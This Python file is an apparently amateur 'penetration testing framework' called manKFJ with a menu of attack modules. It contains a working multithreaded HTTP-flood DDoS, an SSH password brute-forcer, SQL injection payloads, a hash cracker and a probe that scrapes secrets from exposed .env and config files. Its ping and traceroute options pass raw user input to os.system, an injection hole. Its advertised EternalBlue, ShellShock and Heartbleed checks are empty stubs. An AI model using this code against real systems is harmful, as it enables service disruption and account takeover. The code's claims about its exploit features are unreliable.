#!/usr/bin/env python3
"""
manKFJ Security Tool - Penetration Testing Framework
Versione: 3.0.0
Author: manKFJ Team
"""

import os
import sys
import socket
import threading
import subprocess
import time
import random
import string
import hashlib
import base64
import json
import re
import urllib.request
import urllib.parse
import http.client
import ssl
import ftplib
import smtplib
import dns.resolver
import paramiko
import requests
from datetime import datetime
from colorama import init, Fore, Style, Back

# Initialize colorama
init(autoreset=True)

# Version and configuration
VERSION = "3.0.0"
AUTHOR = "manKFJ Team"

class Colors:
    YELLOW = Fore.YELLOW
    GREEN = Fore.GREEN
    RED = Fore.RED
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM

class Banner:
    @staticmethod
    def show():
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Colors.YELLOW}{Colors.BRIGHT}
███╗   ███╗ █████╗ ███╗   ██╗██╗  ██╗███████╗██╗   ██╗
████╗ ████║██╔══██╗████╗  ██║██║ ██╔╝██╔════╝██║   ██║
██╔████╔██║███████║██╔██╗ ██║█████╔╝ █████╗  ██║   ██║
██║╚██╔╝██║██╔══██║██║╚██╗██║██╔═██╗ ██╔══╝  ██║   ██║
██║ ╚═╝ ██║██║  ██║██║ ╚████║██║  ██╗███████╗╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
{Colors.RESET}{Colors.YELLOW}
╔══════════════════════════════════════════════════════════╗
║               SECURITY FRAMEWORK v{VERSION}               ║
║                  Author: {AUTHOR}                  ║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}""")

class Scanner:
    def __init__(self, target):
        self.target = target
        self.ports = []
    
    def port_scan(self, start_port=1, end_port=1024):
        print(f"\n{Colors.YELLOW}[*] Scanning {self.target} ports {start_port}-{end_port}{Colors.RESET}")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port, 'tcp')
                    except:
                        service = 'unknown'
                    print(f"{Colors.GREEN}[+] Port {port} open - {service}{Colors.RESET}")
                    self.ports.append((port, service))
                sock.close()
            except:
                pass
        
        threads = []
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        return self.ports

class BruteForcer:
    def __init__(self, target, port, username=None):
        self.target = target
        self.port = port
        self.username = username
        self.common_passwords = [
            'admin', 'password', '123456', 'qwerty', 'password123',
            'admin123', 'letmein', 'welcome', 'monkey', '123456789',
            '12345678', '12345', '1234', '1234567', 'dragon',
            'football', 'baseball', 'mustang', 'master', 'superman'
        ]
    
    def ssh_bruteforce(self):
        print(f"\n{Colors.YELLOW}[*] Starting SSH brute force on {self.target}:{self.port}{Colors.RESET}")
        
        if not self.username:
            self.username = input(f"{Colors.YELLOW}[?] Enter username: {Colors.RESET}")
        
        for password in self.common_passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.target, port=self.port, username=self.username, 
                           password=password, timeout=5, banner_timeout=5)
                
                print(f"{Colors.GREEN}[+] SUCCESS! Username: {self.username} Password: {password}{Colors.RESET}")
                ssh.close()
                return password
            except:
                print(f"{Colors.RED}[-] Failed: {self.username}:{password}{Colors.RESET}")
        
        print(f"{Colors.RED}[-] Brute force failed{Colors.RESET}")
        return None

class VulnerabilityScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
    
    def check_web_vulns(self):
        print(f"\n{Colors.YELLOW}[*] Checking web vulnerabilities on {self.target}{Colors.RESET}")
        
        urls_to_check = [
            f"http://{self.target}/",
            f"https://{self.target}/",
            f"http://{self.target}/admin",
            f"http://{self.target}/phpmyadmin",
            f"http://{self.target}/wp-admin",
            f"http://{self.target}/config.php",
            f"http://{self.target}/.env",
            f"http://{self.target}/robots.txt"
        ]
        
        for url in urls_to_check:
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Found: {url}{Colors.RESET}")
                    
                    # Check for sensitive information
                    sensitive_patterns = [
                        r'password.*=.*["\'](.*?)["\']',
                        r'api_key.*=.*["\'](.*?)["\']',
                        r'token.*=.*["\'](.*?)["\']',
                        r'database.*=.*["\'](.*?)["\']'
                    ]
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            print(f"{Colors.RED}[!] Sensitive data found in {url}: {matches[0][:50]}...{Colors.RESET}")
                            self.vulnerabilities.append(('Sensitive Data Exposure', url))
                
            except:
                continue
        
        return self.vulnerabilities

class DDoSAttack:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.attack_running = False
    
    def start_attack(self, threads=100, duration=30):
        print(f"\n{Colors.RED}[!] WARNING: DDoS Attack Simulation{Colors.RESET}")
        print(f"{Colors.RED}[!] Target: {self.target}:{self.port}{Colors.RESET}")
        print(f"{Colors.RED}[!] Threads: {threads}{Colors.RESET}")
        print(f"{Colors.RED}[!] Duration: {duration} seconds{Colors.RESET}")
        
        confirm = input(f"\n{Colors.YELLOW}[?] Confirm attack? (y/n): {Colors.RESET}")
        if confirm.lower() != 'y':
            return
        
        self.attack_running = True
        attack_threads = []
        
        def attack():
            while self.attack_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.target, self.port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                    sock.close()
                    print(f"{Colors.RED}[!] Packet sent to {self.target}:{self.port}{Colors.RESET}")
                except:
                    pass
                time.sleep(0.01)
        
        print(f"{Colors.RED}[!] Starting attack...{Colors.RESET}")
        
        # Start attack threads
        for i in range(threads):
            thread = threading.Thread(target=attack)
            attack_threads.append(thread)
            thread.start()
        
        # Run for specified duration
        time.sleep(duration)
        
        # Stop attack
        self.attack_running = False
        
        # Wait for threads to finish
        for thread in attack_threads:
            thread.join()
        
        print(f"{Colors.GREEN}[*] Attack completed{Colors.RESET}")

class SQLInjection:
    def __init__(self, url):
        self.url = url
        self.vulnerable = False
    
    def test_injection(self):
        print(f"\n{Colors.YELLOW}[*] Testing SQL Injection on {self.url}{Colors.RESET}")
        
        test_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT null --",
            "' AND 1=1 --",
            "' AND 1=2 --"
        ]
        
        error_patterns = [
            r'syntax error',
            r'unclosed quotation',
            r'SQL',
            r'database',
            r'mysql',
            r'postgresql',
            r'oracle',
            r'ODBC'
        ]
        
        for payload in test_payloads:
            test_url = f"{self.url}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                
                # Check for SQL errors
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"{Colors.GREEN}[+] SQL Injection found with payload: {payload}{Colors.RESET}")
                        self.vulnerable = True
                        return True
                
            except Exception as e:
                continue
        
        print(f"{Colors.RED}[-] No SQL Injection vulnerability found{Colors.RESET}")
        return False

class InformationGatherer:
    def __init__(self, target):
        self.target = target
    
    def gather_info(self):
        print(f"\n{Colors.YELLOW}[*] Gathering information for {self.target}{Colors.RESET}")
        
        info = {}
        
        # Get IP address
        try:
            ip = socket.gethostbyname(self.target)
            info['ip'] = ip
            print(f"{Colors.GREEN}[+] IP Address: {ip}{Colors.RESET}")
        except:
            info['ip'] = 'Unknown'
        
        # Get WHOIS information
        try:
            import whois
            w = whois.whois(self.target)
            info['whois'] = {
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers
            }
            print(f"{Colors.GREEN}[+] Registrar: {w.registrar}{Colors.RESET}")
        except:
            info['whois'] = 'Not available'
        
        # Get DNS records
        try:
            records = {}
            
            # A records
            answers = dns.resolver.resolve(self.target, 'A')
            records['A'] = [str(r) for r in answers]
            
            # MX records
            answers = dns.resolver.resolve(self.target, 'MX')
            records['MX'] = [str(r.exchange) for r in answers]
            
            info['dns'] = records
            print(f"{Colors.GREEN}[+] DNS Records collected{Colors.RESET}")
        except:
            info['dns'] = 'Not available'
        
        # Get HTTP headers
        try:
            response = requests.get(f"http://{self.target}", timeout=5)
            info['http_headers'] = dict(response.headers)
            
            print(f"{Colors.GREEN}[+] Server: {response.headers.get('Server', 'Unknown')}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Powered-By: {response.headers.get('X-Powered-By', 'Unknown')}{Colors.RESET}")
        except:
            info['http_headers'] = 'Not available'
        
        return info

class Exploiter:
    def __init__(self, target, port):
        self.target = target
        self.port = port
    
    def exploit_common_vulns(self):
        print(f"\n{Colors.YELLOW}[*] Attempting common exploits on {self.target}:{self.port}{Colors.RESET}")
        
        exploits = [
            self.check_eternalblue,
            self.check_shellshock,
            self.check_heartbleed
        ]
        
        results = []
        for exploit in exploits:
            result = exploit()
            if result:
                results.append(result)
        
        return results
    
    def check_eternalblue(self):
        # EternalBlue (MS17-010) check
        if self.port == 445:
            print(f"{Colors.YELLOW}[*] Checking for EternalBlue vulnerability...{Colors.RESET}")
            # Simplified check
            return None
    
    def check_shellshock(self):
        # ShellShock check
        print(f"{Colors.YELLOW}[*] Checking for ShellShock vulnerability...{Colors.RESET}")
        return None
    
    def check_heartbleed(self):
        # Heartbleed check
        if self.port == 443:
            print(f"{Colors.YELLOW}[*] Checking for Heartbleed vulnerability...{Colors.RESET}")
            return None
        
        return None

class PasswordCracker:
    def __init__(self, hash_value):
        self.hash_value = hash_value
    
    def identify_hash(self):
        print(f"\n{Colors.YELLOW}[*] Identifying hash type{Colors.RESET}")
        
        hash_length = len(self.hash_value)
        
        if hash_length == 32:
            print(f"{Colors.GREEN}[+] Possible MD5 hash{Colors.RESET}")
            return 'md5'
        elif hash_length == 40:
            print(f"{Colors.GREEN}[+] Possible SHA1 hash{Colors.RESET}")
            return 'sha1'
        elif hash_length == 64:
            print(f"{Colors.GREEN}[+] Possible SHA256 hash{Colors.RESET}")
            return 'sha256'
        else:
            print(f"{Colors.RED}[-] Unknown hash type{Colors.RESET}")
            return None
    
    def crack_with_wordlist(self, wordlist_file):
        hash_type = self.identify_hash()
        if not hash_type:
            return None
        
        print(f"{Colors.YELLOW}[*] Starting dictionary attack...{Colors.RESET}")
        
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = f.readlines()
            
            for word in words:
                word = word.strip()
                
                if hash_type == 'md5':
                    test_hash = hashlib.md5(word.encode()).hexdigest()
                elif hash_type == 'sha1':
                    test_hash = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type == 'sha256':
                    test_hash = hashlib.sha256(word.encode()).hexdigest()
                else:
                    return None
                
                if test_hash == self.hash_value:
                    print(f"{Colors.GREEN}[+] CRACKED! Password: {word}{Colors.RESET}")
                    return word
        
        except FileNotFoundError:
            print(f"{Colors.RED}[-] Wordlist file not found{Colors.RESET}")
        
        print(f"{Colors.RED}[-] Password not found in wordlist{Colors.RESET}")
        return None

class WebCrawler:
    def __init__(self, url):
        self.url = url
        self.links = []
        self.visited = []
    
    def crawl(self, depth=2):
        print(f"\n{Colors.YELLOW}[*] Crawling {self.url} (depth: {depth}){Colors.RESET}")
        self._crawl_recursive(self.url, depth)
        return self.links
    
    def _crawl_recursive(self, current_url, depth):
        if depth == 0 or current_url in self.visited:
            return
        
        self.visited.append(current_url)
        
        try:
            response = requests.get(current_url, timeout=5)
            
            # Find all links
            links = re.findall(r'href="(.*?)"', response.text)
            
            for link in links:
                absolute_link = urllib.parse.urljoin(current_url, link)
                
                if self.url in absolute_link and absolute_link not in self.links:
                    self.links.append(absolute_link)
                    print(f"{Colors.GREEN}[+] Found: {absolute_link}{Colors.RESET}")
                    
                    # Recursive crawl
                    self._crawl_recursive(absolute_link, depth - 1)
        
        except:
            pass

class manKFJTool:
    def __init__(self):
        Banner.show()
        self.running = True
    
    def display_menu(self):
        print(f"\n{Colors.YELLOW}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}{' '*20}manKFJ MAIN MENU{' '*20}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Port Scanner")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Information Gathering")
        print(f"{Colors.GREEN}[3]{Colors.RESET} Vulnerability Scanner")
        print(f"{Colors.GREEN}[4]{Colors.RESET} Brute Force Attack")
        print(f"{Colors.GREEN}[5]{Colors.RESET} SQL Injection Tester")
        print(f"{Colors.GREEN}[6]{Colors.RESET} DDoS Attack Simulator")
        print(f"{Colors.GREEN}[7]{Colors.RESET} Password Cracker")
        print(f"{Colors.GREEN}[8]{Colors.RESET} Web Crawler")
        print(f"{Colors.GREEN}[9]{Colors.RESET} Exploit Framework")
        print(f"{Colors.GREEN}[10]{Colors.RESET} Network Tools")
        print(f"{Colors.GREEN}[11]{Colors.RESET} About manKFJ")
        print(f"{Colors.GREEN}[0]{Colors.RESET} Exit")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")
    
    def port_scanner_menu(self):
        target = input(f"\n{Colors.YELLOW}[?] Enter target IP/hostname: {Colors.RESET}")
        start_port = input(f"{Colors.YELLOW}[?] Start port (default 1): {Colors.RESET}") or "1"
        end_port = input(f"{Colors.YELLOW}[?] End port (default 1024): {Colors.RESET}") or "1024"
        
        scanner = Scanner(target)
        scanner.port_scan(int(start_port), int(end_port))
    
    def info_gathering_menu(self):
        target = input(f"\n{Colors.YELLOW}[?] Enter target domain/IP: {Colors.RESET}")
        gatherer = InformationGatherer(target)
        gatherer.gather_info()
    
    def vuln_scanner_menu(self):
        target = input(f"\n{Colors.YELLOW}[?] Enter target: {Colors.RESET}")
        scanner = VulnerabilityScanner(target)
        scanner.check_web_vulns()
    
    def brute_force_menu(self):
        target = input(f"\n{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
        port = input(f"{Colors.YELLOW}[?] Enter port (default 22): {Colors.RESET}") or "22"
        service = input(f"{Colors.YELLOW}[?] Service (ssh/ftp/rdp): {Colors.RESET}").lower()
        
        if service == 'ssh':
            try:
                import paramiko
                bruteforcer = BruteForcer(target, int(port))
                bruteforcer.ssh_bruteforce()
            except ImportError:
                print(f"{Colors.RED}[-] Paramiko non installato. Installa con: pip install paramiko{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] Service not implemented yet{Colors.RESET}")
    
    def sql_injection_menu(self):
        url = input(f"\n{Colors.YELLOW}[?] Enter URL to test (with parameters): {Colors.RESET}")
        tester = SQLInjection(url)
        tester.test_injection()
    
    def ddos_menu(self):
        print(f"\n{Colors.RED}[!] WARNING: This is for educational purposes only!{Colors.RESET}")
        target = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
        port = input(f"{Colors.YELLOW}[?] Enter port (default 80): {Colors.RESET}") or "80"
        
        attack = DDoSAttack(target, int(port))
        attack.start_attack(threads=50, duration=10)
    
    def password_cracker_menu(self):
        hash_value = input(f"\n{Colors.YELLOW}[?] Enter hash to crack: {Colors.RESET}")
        wordlist = input(f"{Colors.YELLOW}[?] Enter wordlist path (or press Enter for default): {Colors.RESET}")
        
        cracker = PasswordCracker(hash_value)
        
        if wordlist:
            cracker.crack_with_wordlist(wordlist)
        else:
            print(f"{Colors.RED}[-] Please provide a wordlist{Colors.RESET}")
    
    def web_crawler_menu(self):
        url = input(f"\n{Colors.YELLOW}[?] Enter starting URL: {Colors.RESET}")
        crawler = WebCrawler(url)
        links = crawler.crawl(depth=2)
        
        if links:
            print(f"\n{Colors.GREEN}[+] Found {len(links)} links{Colors.RESET}")
    
    def exploit_menu(self):
        print(f"\n{Colors.YELLOW}[*] Exploit Framework{Colors.RESET}")
        print(f"{Colors.YELLOW}[1]{Colors.RESET} Check EternalBlue")
        print(f"{Colors.YELLOW}[2]{Colors.RESET} Check ShellShock")
        print(f"{Colors.YELLOW}[3]{Colors.RESET} Check Heartbleed")
        print(f"{Colors.YELLOW}[4]{Colors.RESET} Back")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.RESET}")
        
        if choice == '1':
            target = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
            exploit = Exploiter(target, 445)
            exploit.check_eternalblue()
    
    def network_tools_menu(self):
        print(f"\n{Colors.YELLOW}[*] Network Tools{Colors.RESET}")
        print(f"{Colors.YELLOW}[1]{Colors.RESET} Ping")
        print(f"{Colors.YELLOW}[2]{Colors.RESET} Traceroute")
        print(f"{Colors.YELLOW}[3]{Colors.RESET} DNS Lookup")
        print(f"{Colors.YELLOW}[4]{Colors.RESET} WHOIS Lookup")
        print(f"{Colors.YELLOW}[5]{Colors.RESET} Back")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.RESET}")
        
        if choice == '1':
            target = input(f"{Colors.YELLOW}[?] Enter target: {Colors.RESET}")
            os.system(f"ping -c 4 {target}" if os.name == 'posix' else f"ping -n 4 {target}")
        elif choice == '2':
            target = input(f"{Colors.YELLOW}[?] Enter target: {Colors.RESET}")
            os.system(f"traceroute {target}" if os.name == 'posix' else f"tracert {target}")
    
    def about_menu(self):
        print(f"""
{Colors.YELLOW}{'='*60}{Colors.RESET}
{Colors.YELLOW}                  manKFJ SECURITY TOOL{Colors.RESET}
{Colors.YELLOW}{'='*60}{Colors.RESET}
{Colors.GREEN}Version:{Colors.RESET} {VERSION}
{Colors.GREEN}Author:{Colors.RESET} {AUTHOR}
{Colors.GREEN}Purpose:{Colors.RESET} Penetration Testing Framework
{Colors.GREEN}License:{Colors.RESET} Educational Use Only

{Colors.YELLOW}Features:{Colors.RESET}
• Port Scanning
• Vulnerability Assessment
• Password Cracking
• Web Application Testing
• Network Analysis
• Exploit Framework

{Colors.RED}Disclaimer:{Colors.RESET}
This tool is for educational purposes only.
Use only on systems you own or have permission to test.
The author is not responsible for any misuse.
{Colors.YELLOW}{'='*60}{Colors.RESET}
""")
    
    def run(self):
        while self.running:
            self.display_menu()
            choice = input(f"\n{Colors.YELLOW}[manKFJ] > {Colors.RESET}")
            
            menu_options = {
                '1': self.port_scanner_menu,
                '2': self.info_gathering_menu,
                '3': self.vuln_scanner_menu,
                '4': self.brute_force_menu,
                '5': self.sql_injection_menu,
                '6': self.ddos_menu,
                '7': self.password_cracker_menu,
                '8': self.web_crawler_menu,
                '9': self.exploit_menu,
                '10': self.network_tools_menu,
                '11': self.about_menu,
                '0': self.exit_tool
            }
            
            if choice in menu_options:
                try:
                    menu_options[choice]()
                except Exception as e:
                    print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Invalid option!{Colors.RESET}")
            
            if choice != '0':
                input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
    
    def exit_tool(self):
        print(f"\n{Colors.GREEN}[*] Thank you for using manKFJ!{Colors.RESET}")
        print(f"{Colors.GREEN}[*] Stay secure!{Colors.RESET}")
        self.running = False

def check_root():
    """Check if running as root/administrator"""
    if os.name == 'posix':
        if os.geteuid() != 0:
            print(f"{Colors.YELLOW}[!] Warning: Not running as root{Colors.RESET}")
    else:
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                print(f"{Colors.YELLOW}[!] Warning: Not running as administrator{Colors.RESET}")
        except:
            pass

def check_dependencies():
    """Check required dependencies"""
    required = ['requests', 'colorama']
    optional = ['paramiko', 'dnspython', 'whois']
    
    missing_required = []
    missing_optional = []
    
    for package in required:
        try:
            __import__(package)
        except ImportError:
            missing_required.append(package)
    
    for package in optional:
        try:
            __import__(package)
        except ImportError:
            missing_optional.append(package)
    
    if missing_required:
        print(f"{Colors.RED}[!] Missing required dependencies:{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Install with: pip install {' '.join(missing_required)}{Colors.RESET}")
        return False
    
    if missing_optional:
        print(f"{Colors.YELLOW}[!] Missing optional dependencies:{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] For full features: pip install {' '.join(missing_optional)}{Colors.RESET}")
    
    return True

def main():
    try:
        check_root()
        
        if not check_dependencies():
            print(f"\n{Colors.YELLOW}[!] Some features may not work without all dependencies{Colors.RESET}")
            input(f"{Colors.YELLOW}[*] Press Enter to continue anyway...{Colors.RESET}")
        
        tool = manKFJTool()
        tool.run()
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[*] Tool interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[-] Critical error: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()